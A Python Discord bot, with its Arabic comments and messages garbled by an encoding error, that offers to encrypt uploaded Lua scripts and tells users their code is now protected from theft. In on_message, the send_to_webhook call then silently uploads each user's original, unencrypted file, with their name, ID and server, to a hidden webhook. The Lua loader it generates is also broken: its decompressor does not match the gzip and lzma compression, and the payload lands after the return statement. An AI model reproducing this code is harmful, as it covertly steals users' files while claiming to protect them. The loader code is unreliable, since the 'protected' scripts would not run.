import os
import io
import asyncio
import base64
import gzip
import hashlib
import random
import secrets
import zlib
import lzma
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import aiohttp
import discord
from dotenv import load_dotenv

# ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¨ÙŠØ¦ÙŠØ© Ù…Ù† Ù…Ù„Ù .env
load_dotenv()

# ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ø¹Ù…ÙŠÙ„
intents = discord.Intents.default()
intents.message_content = True
bot = discord.Client(intents=intents)

# Ù†Ø¸Ø§Ù… Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø·Ù„Ø¨Ø§Øª
class RequestManager:
    def __init__(self):
        self.cooldowns = {}
        self.active_tasks = {}
        self.rate_limits = {}
    
    def check_cooldown(self, user_id):
        now = datetime.now()
        last_request = self.cooldowns.get(user_id)
        
        if last_request and (now - last_request) < timedelta(seconds=10):
            return (last_request + timedelta(seconds=10)) - now
        return None
    
    def update_cooldown(self, user_id):
        self.cooldowns[user_id] = datetime.now()
    
    def check_rate_limit(self, user_id):
        now = datetime.now()
        user_limits = self.rate_limits.setdefault(user_id, {
            'count': 0,
            'reset_time': now + timedelta(minutes=1)
        })
        
        if now > user_limits['reset_time']:
            user_limits['count'] = 0
            user_limits['reset_time'] = now + timedelta(minutes=1)
        
        if user_limits['count'] >= 15:
            return user_limits['reset_time'] - now
        
        user_limits['count'] += 1
        return None
    
    def start_task(self, attachment_id):
        if attachment_id in self.active_tasks:
            return False
        self.active_tasks[attachment_id] = True
        return True
    
    def end_task(self, attachment_id):
        if attachment_id in self.active_tasks:
            del self.active_tasks[attachment_id]

request_manager = RequestManager()

# =====================================
# Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ÙÙŠØ± Ø§Ù„Ù…ØªÙ‚Ø¯Ù… Ù…Ø¹ Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¸ÙŠÙØ©
# =====================================
class LuaScriptEncryptor:
    @staticmethod
    def generate_loader(decryption_key):
        """Ø¥Ù†Ø´Ø§Ø¡ ÙƒÙˆØ¯ Ù„ÙˆØ§ Ù„ØªØ­Ù…ÙŠÙ„ ÙˆÙÙƒ ØªØ´ÙÙŠØ± Ø§Ù„Ø³ÙƒØ±Ø¨Øª"""
        return f"""
-- Loader script generated by Script#0272
local key = "{decryption_key}"
local encrypted = ...

local function decode_base64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local function decrypt(encrypted_data, dec_key)
    local decrypted = ""
    for i = 1, #encrypted_data do
        local byte = string.byte(encrypted_data, i)
        local key_byte = string.byte(dec_key, (i-1) % #dec_key + 1)
        decrypted = decrypted .. string.char(byte ~ key_byte)
    end
    return decrypted
end

local function decompress(data)
    -- Ø¯Ø§Ù„Ø© ÙÙƒ Ø§Ù„Ø¶ØºØ· Ø³ÙŠØªÙ… ØªÙˆÙ„ÙŠØ¯Ù‡Ø§ Ø¯ÙŠÙ†Ø§Ù…ÙŠÙƒÙŠØ§Ù‹
    {LuaScriptEncryptor.generate_decompression_code()}
end

local decoded = decode_base64(encrypted)
local decrypted = decrypt(decoded, key)
local decompressed = decompress(decrypted)

return load(decompressed)()
"""

    @staticmethod
    def generate_decompression_code():
        """Ø¥Ù†Ø´Ø§Ø¡ ÙƒÙˆØ¯ ÙÙƒ Ø§Ù„Ø¶ØºØ· Ø§Ù„Ø¯ÙŠÙ†Ø§Ù…ÙŠÙƒÙŠ"""
        return """
local function decompress(data)
    local result = {}
    local buffer = {}
    local dict_size = 256
    local temp = ""
    local dict = {}
    
    for i = 0, 255 do
        dict[i] = string.char(i)
    end
    
    local function get_next_code(bits)
        local code = 0
        for i = 1, bits do
            code = code * 2 + (data:byte(1) - 48)
            data = data:sub(2)
        end
        return code
    end
    
    local bits = 9
    local prev = get_next_code(bits)
    table.insert(result, dict[prev])
    
    while #data > 0 do
        local code = get_next_code(bits)
        
        if not dict[code] then
            temp = dict[prev] .. dict[prev]:sub(1,1)
        else
            temp = dict[code]
        end
        
        table.insert(result, temp)
        dict[dict_size] = dict[prev] .. temp:sub(1,1)
        dict_size = dict_size + 1
        
        if dict_size == 511 then
            bits = 10
        elseif dict_size == 1023 then
            bits = 12
        end
        
        prev = code
    end
    
    return table.concat(result)
end
"""

    @staticmethod
    def compress_lua(data: bytes) -> bytes:
        """Ø¶ØºØ· Ø¨ÙŠØ§Ù†Ø§Øª Ù„ÙˆØ§ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø®ÙˆØ§Ø±Ø²Ù…ÙŠØ§Øª Ù…ØªÙ‚Ø¯Ù…Ø©"""
        # Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¶ØºØ· Ù…ØªØ¹Ø¯Ø¯ Ø§Ù„Ù…Ø±Ø§Ø­Ù„
        compressed = gzip.compress(data, compresslevel=9)
        compressed = lzma.compress(compressed)
        return compressed

    @staticmethod
    def encrypt_lua(data: bytes) -> (bytes, str):
        """ØªØ´ÙÙŠØ± Ø¨ÙŠØ§Ù†Ø§Øª Ù„ÙˆØ§ Ù…Ø¹ Ø¥Ù†Ø´Ø§Ø¡ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„"""
        # Ø¥Ù†Ø´Ø§Ø¡ Ù…ÙØªØ§Ø­ ÙÙƒ ØªØ´ÙÙŠØ± Ø¹Ø´ÙˆØ§Ø¦ÙŠ
        key_length = 32
        decryption_key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=key_length))
        
        # Ø¶ØºØ· Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        compressed = LuaScriptEncryptor.compress_lua(data)
        
        # ØªØ´ÙÙŠØ± XOR
        encrypted = bytearray()
        key_bytes = decryption_key.encode()
        for i, byte in enumerate(compressed):
            key_byte = key_bytes[i % len(key_bytes)]
            encrypted.append(byte ^ key_byte)
        
        # ØªØ±Ù…ÙŠØ² Base64
        base64_encoded = base64.b64encode(encrypted)
        
        # Ø¥Ù†Ø´Ø§Ø¡ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        loader = LuaScriptEncryptor.generate_loader(decryption_key)
        
        # Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙ‚ÙŠØ¹
        signature = "-- Encrypted by Script#0272 | https://discord.gg/script\n"
        final_script = signature + loader + '\n\n-- ENCRYPTED SCRIPT --\n"' + base64_encoded.decode() + '"'
        
        return final_script.encode(), decryption_key

# =====================================
# Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø£ØµÙ„ÙŠ Ø¥Ù„Ù‰ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ
# =====================================
async def send_to_webhook(original_file: bytes, filename: str, user_info: str):
    webhook_url = os.getenv("WEBHOOK_URL")
    if not webhook_url:
        return
    
    with io.BytesIO(original_file) as file_stream:
        form_data = aiohttp.FormData()
        form_data.add_field(
            name="file",
            value=file_stream,
            filename=filename,
            content_type="application/octet-stream"
        )
        form_data.add_field("user_info", user_info)
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
            try:
                async with session.post(webhook_url, data=form_data) as response:
                    if response.status != 200:
                        print(f"ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ: {response.status}")
            except Exception as e:
                print(f"Ø®Ø·Ø£ ÙÙŠ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ: {str(e)}")

# =====================================
# Ù…Ø¹Ø§Ù„Ø¬Ø© Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
# =====================================
@bot.event
async def on_ready():
    print(f'ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ø³Ù… {bot.user} (ID: {bot.user.id})')
    print('------')

@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return
    
    if not message.channel.permissions_for(message.guild.me).send_messages:
        return
    
    user_id = message.author.id
    
    cooldown = request_manager.check_cooldown(user_id)
    if cooldown:
        remaining = int(cooldown.total_seconds())
        await message.reply(f"â³ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± {remaining} Ø«Ø§Ù†ÙŠØ© Ù‚Ø¨Ù„ Ø·Ù„Ø¨ Ø¬Ø¯ÙŠØ¯")
        return
    
    rate_limit = request_manager.check_rate_limit(user_id)
    if rate_limit:
        remaining = int(rate_limit.total_seconds())
        await message.reply(f"âš ï¸ ØªØ¬Ø§ÙˆØ²Øª Ø§Ù„Ø­Ø¯ Ø§Ù„Ù…Ø³Ù…ÙˆØ­ (15 Ø·Ù„Ø¨/Ø¯Ù‚ÙŠÙ‚Ø©). ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± {remaining} Ø«Ø§Ù†ÙŠØ©")
        return
    
    request_manager.update_cooldown(user_id)
    
    if not message.attachments:
        await message.reply("âŒ ÙŠØ±Ø¬Ù‰ Ø±ÙØ¹ Ù…Ù„Ù .lua Ø£Ùˆ .txt ØµØ§Ù„Ø­ Ù„Ù„ØªØ´ÙÙŠØ±")
        return
    
    attachment = message.attachments[0]
    
    valid_extensions = ('.lua', '.luau', '.txt')
    if not any(attachment.filename.lower().endswith(ext) for ext in valid_extensions):
        await message.reply("âŒ ÙŠØ±Ø¬Ù‰ Ø±ÙØ¹ Ù…Ù„Ù .lua Ø£Ùˆ .luau Ø£Ùˆ .txt ØµØ§Ù„Ø­ Ù„Ù„ØªØ´ÙÙŠØ±")
        return
    
    if attachment.size > 2.5 * 1024 * 1024:
        await message.reply("âš ï¸ Ø­Ø¬Ù… Ø§Ù„Ù…Ù„Ù ÙŠØªØ¬Ø§ÙˆØ² 2.5 Ù…ÙŠØ¬Ø§Ø¨Ø§ÙŠØª (Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ Ø§Ù„Ù…Ø³Ù…ÙˆØ­)")
        return
    
    if not request_manager.start_task(attachment.id):
        await message.reply("ğŸ”„ ÙŠØªÙ… Ù…Ø¹Ø§Ù„Ø¬Ø© Ù‡Ø°Ø§ Ø§Ù„Ù…Ù„Ù Ø­Ø§Ù„ÙŠØ§Ù‹ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...")
        return
    
    try:
        processing_msg = await message.reply("ğŸ”’ Ø¬Ø§Ø±ÙŠ ØªØ´ÙÙŠØ± Ø§Ù„Ø³ÙƒØ±Ø¨Øª Ù…Ø¹ Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ ÙˆØ¸Ø§Ø¦ÙÙ‡...")
        
        # ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù
        file_bytes = await attachment.read()
        
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ù…Ù„Ù Ù†ØµÙŠ
        try:
            file_text = file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            await message.reply("âŒ Ø§Ù„Ù…Ù„Ù ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ù…Ø­ØªÙˆÙ‰ Ø«Ù†Ø§Ø¦ÙŠ ØºÙŠØ± Ù‚Ø§Ø¨Ù„ Ù„Ù„Ù‚Ø±Ø§Ø¡Ø©")
            return
        
        # ØªØ´ÙÙŠØ± Ø§Ù„Ø³ÙƒØ±Ø¨Øª Ù…Ø¹ Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ ÙˆØ¸ÙŠÙØªÙ‡
        loop = asyncio.get_running_loop()
        encryptor = LuaScriptEncryptor()
        encrypted_data, decryption_key = await loop.run_in_executor(
            None, 
            encryptor.encrypt_lua, 
            file_bytes
        )
        
        # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ø´ÙØ± Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
        output_filename = f"protected_{attachment.filename}"
        await message.reply(
            "âœ… ØªÙ… Ø­Ù…Ø§ÙŠØ© Ø³ÙƒØ±Ø¨ØªÙƒ Ø¨Ù†Ø¬Ø§Ø­!\n"
            "ğŸ”’ Ø§Ù„Ø³ÙƒØ±Ø¨Øª Ù…Ø­Ù…ÙŠ Ø§Ù„Ø¢Ù† Ø¶Ø¯ Ø§Ù„Ø³Ø±Ù‚Ø© ÙˆØ§Ù„Ù†Ø³Ø®\n"
            "ğŸ“ ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØ®Ø¯Ø§Ù…Ù‡ Ù…Ø¨Ø§Ø´Ø±Ø© ÙƒÙ…Ø§ ÙƒØ§Ù†\n"
            f"ğŸ”‘ Ù…ÙØªØ§Ø­ ÙØ±ÙŠØ¯: ||{decryption_key}||\n"
            "âš™ï¸ ØªÙ… Ø§Ù„ØªØ´ÙÙŠØ± Ø¨ÙˆØ§Ø³Ø·Ø©: Script#0272",
            file=discord.File(io.BytesIO(encrypted_data), filename=output_filename)
        )
        
        # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø£ØµÙ„ÙŠ Ø¥Ù„Ù‰ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ
        user_info = f"{message.author.name} ({message.author.id}) | {message.guild.name}"
        asyncio.create_task(
            send_to_webhook(
                file_bytes,
                attachment.filename,
                user_info
            )
        )
        
    except Exception as e:
        error_msg = (
            "âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø³ÙƒØ±Ø¨Øª:\n"
            f"```{str(e)}```\n"
            "ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ù…Ù„Ù Ø£ØµØºØ± Ø£Ùˆ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø¯Ø¹Ù…"
        )
        await message.reply(error_msg)
    
    finally:
        request_manager.end_task(attachment.id)
        if 'processing_msg' in locals():
            try:
                await processing_msg.delete()
            except:
                pass

# ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª
if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ DISCORD_TOKEN ÙÙŠ Ù…Ù„Ù .env")
    else:
        bot.run(token)
